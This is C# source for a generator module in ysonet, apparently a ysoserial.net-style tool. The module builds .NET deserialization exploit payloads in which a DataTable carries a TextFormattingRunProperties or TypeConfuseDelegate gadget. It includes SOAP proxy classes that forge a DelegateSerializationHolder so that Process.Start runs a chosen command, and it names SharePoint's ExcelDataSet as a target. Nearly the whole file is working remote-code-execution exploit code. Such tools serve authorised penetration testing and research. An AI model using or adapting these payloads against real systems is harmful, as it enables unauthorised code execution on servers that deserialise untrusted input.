using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Soap;
using System.Text;
using System.Xml;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * DataTable payload carrier.
     *
     * A System.Data.DataTable with RemotingFormat = SerializationFormat.Binary can
     * hold an arbitrary object in an "object" column. The outer formatter serializes
     * and later deserializes that cell as part of the SAME object graph, so a live
     * inner gadget placed in the cell fires on deserialize.
     *
     * This is a same-graph ROOT CARRIER, not a new sink. A standalone DataTable
     * stores its row values inline in its own SerializationInfo (the
     * "DataTable_N.Records" ArrayList in DataTable.SerializeTableData), so the same
     * outer formatter serializes and deserializes both the DataTable and the inner
     * gadget. Unlike the DataSet gadget it opens NO nested BinaryFormatter and NO new
     * binder boundary.
     *
     * Verified against the .NET Framework System.Data source: DataSet builds a fresh
     * "new BinaryFormatter(...)" per table on both serialize and deserialize
     * (DataSet.cs), while DataTable uses no BinaryFormatter at all and reads its rows
     * back with info.GetValue("DataTable_N.Records", typeof(ArrayList)). So the two are
     * genuinely different: DataSet is a nested-formatter bridge, DataTable is a carrier.
     *
     * Useful when a target requires or casts the deserialized root object to DataTable,
     * for example SharePoint's ExcelDataSet.CompressedDataTable. Microsoft treats
     * deserializing a DataTable with an unsafe formatter as a full remote code execution
     * risk (analyzer CA2362 and the DataSet/DataTable security guidance).
     *
     * The inner gadget is selectable via the var/variant option:
     *   Variant 1 (default): TextFormattingRunProperties (XAML ObjectDataProvider ->
     *     Process.Start), which needs the Microsoft.PowerShell.Editor assembly and WPF.
     *     Supports BinaryFormatter, SoapFormatter and LosFormatter.
     *   Variant 2: TypeConfuseDelegate, a framework built-in inner that needs no WPF or
     *     Microsoft.PowerShell.Editor. BinaryFormatter and LosFormatter carry the live
     *     object graph; SoapFormatter uses non-generic authoring aliases inside the table
     *     and exposes the native CLR4 SortedSet/ComparisonComparer graph to the target.
     * Variant 1 stays the default so -g DataTable keeps producing the same payload it did
     * before the variant was added.
     *
     * James Forshaw's "Are You My Type?" (Black Hat 2012) documents the related but
     * DISTINCT DataSet nested-BinaryFormatter bridge, not this DataTable carrier:
     * https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
     */
    public class DataTableGenerator : GenericGenerator
    {
        private const string SoapSetAliasNamespace = "YsonetDataTableTcdSoapSetProxy";
        private const string SoapSetAliasType = "YsonetDataTableTcdSetAlias";
        private const string SoapComparerAliasNamespace = "YsonetDataTableTcdSoapComparerProxy";
        private const string SoapComparerAliasType = "YsonetDataTableTcdComparerAlias";

        // Discovery facets (category search only): this is the DEFAULT variant 1. The
        // complete payload runs code via the inner TextFormattingRunProperties gadget
        // (XAML ObjectDataProvider). That inner gadget needs Microsoft.PowerShell.Editor
        // (extra assembly) and WPF, so variant 1 is NOT BuiltIn. No nested formatter is
        // used, so the kind is code-execution, not nested-deserialization, and there is no
        // Bridged label. Variant 2 (TypeConfuseDelegate) is framework built-in and declares
        // its own facet override in Variants().
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(
                    GadgetRequirement.ExtraAssembly,
                    GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework)
                // Variant 1 (TextFormattingRunProperties inner); fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "Same-graph System.Data.DataTable root carrier: the inner "
                + "TextFormattingRunProperties gadget travels in an object column and is "
                + "deserialized by the same outer formatter. A standalone DataTable stores "
                + "its rows inline in its own SerializationInfo (DataTable_N.Records), so "
                + "unlike the DataSet gadget it opens no nested BinaryFormatter and no new "
                + "binder boundary (verified against the System.Data source). Useful when a "
                + "target requires or casts the deserialized root object to DataTable, for "
                + "example SharePoint's ExcelDataSet.CompressedDataTable. Microsoft treats "
                + "deserializing a DataTable with an unsafe formatter as a full remote code "
                + "execution risk (CA2362, DataSet/DataTable security guidance). The inner "
                + "gadget is selectable with var/variant: 1 (default) TextFormattingRunProperties, "
                + "which needs the Microsoft.PowerShell.Editor assembly and WPF and supports "
                + "BinaryFormatter, SoapFormatter and LosFormatter; 2 TypeConfuseDelegate, a "
                + "framework built-in that needs no WPF or Microsoft.PowerShell.Editor and "
                + "supports BinaryFormatter, SoapFormatter and LosFormatter. Its SOAP form "
                + "uses generation-only aliases but presents the native CLR4 TCD graph to the "
                + "target. Forshaw's 'Are You My Type?' (Black Hat 2012) documents the "
                + "related but distinct DataSet nested-BinaryFormatter bridge.";
        }

        public override List<string> Labels()
        {
            // Empty on purpose: DataTable serializes its own type, so it is not a
            // GadgetTags.Hosted payload. Having a var/variant selector earns no tag.
            return new List<string>();
        }

        private int variant_number = 1; // Default: TextFormattingRunProperties inner

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "TextFormattingRunProperties inner (default)"),
                // Variant 2 wraps TypeConfuseDelegate. SOAP uses the complete authoring
                // proxy below, so the variant has no formatter exclusion. It is framework
                // built-in (no WPF, no Microsoft.PowerShell.Editor), so it declares its
                // own facet override.
                new GadgetVariant(2, "TypeConfuseDelegate inner (built-in, no WPF)")
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.CodeExecution)
                        .WithRequirements(GadgetRequirement.BuiltIn,
                            GadgetRequirement.NetFramework)
                        // The TypeConfuseDelegate inner needs the 4.5-era
                        // ComparisonComparer, so this variant starts later than
                        // variant 1. Fired on 4.8.1.
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481)))
            };
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|variant=",
                    "Inner gadget: 1 -> TextFormattingRunProperties [default], "
                        + "2 -> TypeConfuseDelegate (built-in, no WPF)",
                    v => int.TryParse(v, out variant_number)
                }
            };
        }

        // These three are the complete achievable set, not an arbitrary pick. The gadget
        // carries a LIVE ISerializable object in an object column, so only the runtime
        // formatters that honor ISerializable and can serialize an arbitrary object graph
        // can deliver it. Every XML serializer fails the same way (verified empirically):
        // NetDataContractSerializer, DataContractSerializer, and XmlSerializer all throw
        // "does not implement IXmlSerializable" because DataTable requires object-typed
        // column cells to implement IXmlSerializable, which a normal gadget object does not.
        public override List<string> SupportedFormatters()
        {
            // The "(N)" suffix is a display-only annotation meaning "this formatter
            // carries N variants". All three carry both inner gadgets.
            return new List<string>
            {
                Formatters.BinaryFormatter + " (2)",
                Formatters.SoapFormatter + " (2)",
                Formatters.LosFormatter + " (2)"
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            GuardVariantFormatter(variant_number, formatter);

            if (variant_number == 2
                && formatter.Equals(Formatters.SoapFormatter,
                    StringComparison.OrdinalIgnoreCase))
                return SerializeSoapTcdTable(inputArgs);

            // Live [Serializable] inner gadget object (not bytes), placed straight into
            // the DataTable cell so it rides the same outer object graph. Variant 2 uses
            // the built-in TypeConfuseDelegate inner; any other value falls back to the
            // default TextFormattingRunProperties inner.
            object inner = variant_number == 2
                ? TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs)
                : TextFormattingRunPropertiesGenerator
                    .TextFormattingRunPropertiesGadget(inputArgs);

            DataTable table = new DataTable("x");
            table.RemotingFormat = SerializationFormat.Binary; // binary remoting: object cells travel in the graph
            table.Columns.Add("x", typeof(object));
            table.Rows.Add(new object[] { inner });
            table.AcceptChanges(); // commit the row so it serializes with a stable record layout

            // BinaryFormatter and LosFormatter minification uses a custom minifying
            // formatter that cannot serialize a live System.Data.DataTable (it throws
            // NullReference on the DataTable object graph). For those two, minify only
            // the inner TFRP XAML (already done above via inputArgs.Minify) and serialize
            // the outer table with the standard formatter. The XAML is the bulk of the
            // payload, so this still shrinks it. SoapFormatter minifies its XML output
            // (XmlMinifier), which works fine on a DataTable, so it keeps full minification.
            InputArgs outerArgs = inputArgs;
            if (inputArgs.Minify
                && (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                    || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)))
            {
                outerArgs = inputArgs.DeepCopy();
                outerArgs.Minify = false;
            }

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(table, formatter, outerArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        // ---- Direct SOAP form of the TCD-in-DataTable graph -------------------

        // The stock writer can serialize DataTable and it can serialize the final TCD
        // contracts, but it rejects a live closed-generic SortedSet before asking for its
        // serialization data. The aliases below sit in the object column only while the
        // document is authored. Structural XML-name replacement removes them before the
        // payload leaves ysonet, so the reader sees DataTable -> SortedSet<string> ->
        // ComparisonComparer<string> -> DelegateSerializationHolder.
        private object SerializeSoapTcdTable(InputArgs inputArgs)
        {
            string fromFile = inputArgs.CmdFromFile;
            if (!String.IsNullOrEmpty(fromFile))
                inputArgs.Cmd = fromFile;

            string executable = inputArgs.CmdFileName;
            string arguments = inputArgs.HasArguments ? inputArgs.CmdArguments : "";
            NoteIfArgumentsWillBeSwapped(inputArgs, executable, arguments);

            var comparer = new SoapComparisonComparerProxy();
            int order = comparer.Compare(executable, arguments);
            string[] items = order == 0
                ? new string[] { executable }
                : (order < 0
                    ? new string[] { executable, arguments }
                    : new string[] { arguments, executable });

            DataTable table = new DataTable("x");
            table.RemotingFormat = SerializationFormat.Binary;
            table.Columns.Add("x", typeof(object));
            table.Rows.Add(new object[] { new SoapSetProxy(comparer, items) });
            table.AcceptChanges();

            string payload;
            using (MemoryStream stream = new MemoryStream())
            {
                new SoapFormatter().Serialize(stream, table);
                payload = Encoding.UTF8.GetString(stream.ToArray());
            }

            XmlDocument document = new XmlDocument();
            document.PreserveWhitespace = true;
            document.LoadXml(payload);
            Type comparisonComparer = RequireSoapType(typeof(Comparer<>).Assembly,
                "System.Collections.Generic.ComparisonComparer`1").MakeGenericType(
                    typeof(string));
            RewriteSoapTypeAlias(document, SoapSetAliasNamespace, SoapSetAliasType,
                typeof(SortedSet<string>).FullName,
                typeof(SortedSet<string>).Assembly.FullName);
            RewriteSoapTypeAlias(document, SoapComparerAliasNamespace, SoapComparerAliasType,
                comparisonComparer.FullName, comparisonComparer.Assembly.FullName);
            payload = document.OuterXml;

            if (inputArgs.Minify)
                payload = XmlMinifier.Minify(payload, null, null,
                    FormatterType.SoapFormatter, true);
            return FinishHandWrittenPayload(payload, Formatters.SoapFormatter,
                inputArgs, null, true);
        }

        private static void NoteIfArgumentsWillBeSwapped(InputArgs inputArgs,
            string executable, string arguments)
        {
            if (String.Compare(executable, arguments) >= 0)
                return;
            Debugging.ShowNote(inputArgs,
                "[DataTable TypeConfuseDelegate inner] The executable string sorts BELOW "
                + "the argument string, so this payload swaps the two Process.Start "
                + "arguments. Drop --rawcmd, or change the command so the executable sorts "
                + "above its arguments.");
        }

        private static Type RequireSoapType(Assembly assembly, string fullName)
        {
            Type type = assembly.GetType(fullName, false);
            if (type == null)
                throw new SerializationException("Required SOAP target type is unavailable: "
                    + fullName + " in " + assembly.FullName);
            return type;
        }

        private static MethodInfo RequireStaticMethod(Type type, string name,
            params Type[] parameters)
        {
            MethodInfo method = type.GetMethod(name, BindingFlags.Static | BindingFlags.Public,
                null, parameters, null);
            if (method == null)
                throw new SerializationException("Required SOAP target method is unavailable: "
                    + type.FullName + "." + name);
            return method;
        }

        private static void SetSoapAlias(SerializationInfo info, string aliasNamespace,
            string aliasType)
        {
            info.FullTypeName = aliasNamespace + "." + aliasType;
            info.AssemblyName = aliasNamespace;
        }

        [Serializable]
        private sealed class SoapComparisonComparerProxy : IComparer<string>, ISerializable
        {
            private readonly SoapDelegateProxy comparison = new SoapDelegateProxy();

            internal SoapComparisonComparerProxy() { }

            private SoapComparisonComparerProxy(SerializationInfo info,
                StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP comparer proxy is never deserialized.");
            }

            public int Compare(string left, string right)
            {
                return String.Compare(left, right);
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapComparerAliasNamespace, SoapComparerAliasType);
                info.AddValue("_comparison", comparison, typeof(object));
            }
        }

        [Serializable]
        private sealed class SoapDelegateEntryProxy : ISerializable
        {
            private readonly string delegateType;
            private readonly string delegateAssembly;
            private readonly string targetAssembly;
            private readonly string targetType;
            private readonly string method;
            private readonly SoapDelegateEntryProxy next;

            internal SoapDelegateEntryProxy(string delegateType, string delegateAssembly,
                string targetAssembly, string targetType, string method,
                SoapDelegateEntryProxy next)
            {
                this.delegateType = delegateType;
                this.delegateAssembly = delegateAssembly;
                this.targetAssembly = targetAssembly;
                this.targetType = targetType;
                this.method = method;
                this.next = next;
            }

            private SoapDelegateEntryProxy(SerializationInfo info,
                StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP delegate-entry proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireSoapType(typeof(object).Assembly,
                    "System.DelegateSerializationHolder+DelegateEntry"));
                info.AddValue("type", delegateType);
                info.AddValue("assembly", delegateAssembly);
                info.AddValue("target", null);
                info.AddValue("targetTypeAssembly", targetAssembly);
                info.AddValue("targetTypeName", targetType);
                info.AddValue("methodName", method);
                info.AddValue("delegateEntry", next);
            }
        }

        [Serializable]
        private sealed class SoapDelegateProxy : ISerializable
        {
            private readonly SoapDelegateEntryProxy entry;

            internal SoapDelegateProxy()
            {
                SoapDelegateEntryProxy benign = new SoapDelegateEntryProxy(
                    typeof(Comparison<string>).FullName,
                    typeof(Comparison<string>).Assembly.FullName,
                    typeof(string).Assembly.FullName,
                    typeof(string).FullName,
                    "Compare", null);
                entry = new SoapDelegateEntryProxy(
                    typeof(Func<string, string, Process>).FullName,
                    typeof(Func<string, string, Process>).Assembly.FullName,
                    typeof(Process).Assembly.FullName,
                    typeof(Process).FullName,
                    "Start", benign);
            }

            private SoapDelegateProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP delegate proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireSoapType(typeof(object).Assembly,
                    "System.DelegateSerializationHolder"));
                info.AddValue("Delegate", entry);
                info.AddValue("method0", RequireStaticMethod(typeof(Process), "Start",
                    typeof(string), typeof(string)));
                info.AddValue("method1", RequireStaticMethod(typeof(string), "Compare",
                    typeof(string), typeof(string)));
            }
        }

        [Serializable]
        private sealed class SoapSetProxy : ISerializable
        {
            private readonly SoapComparisonComparerProxy comparer;
            private readonly string[] items;

            internal SoapSetProxy(SoapComparisonComparerProxy comparer, string[] items)
            {
                this.comparer = comparer;
                this.items = items;
            }

            private SoapSetProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP set proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapSetAliasNamespace, SoapSetAliasType);
                info.AddValue("Count", items.Length);
                info.AddValue("Comparer", comparer, typeof(object));
                info.AddValue("Version", items.Length);
                info.AddValue("Items", items, typeof(string[]));
            }
        }
    }
}
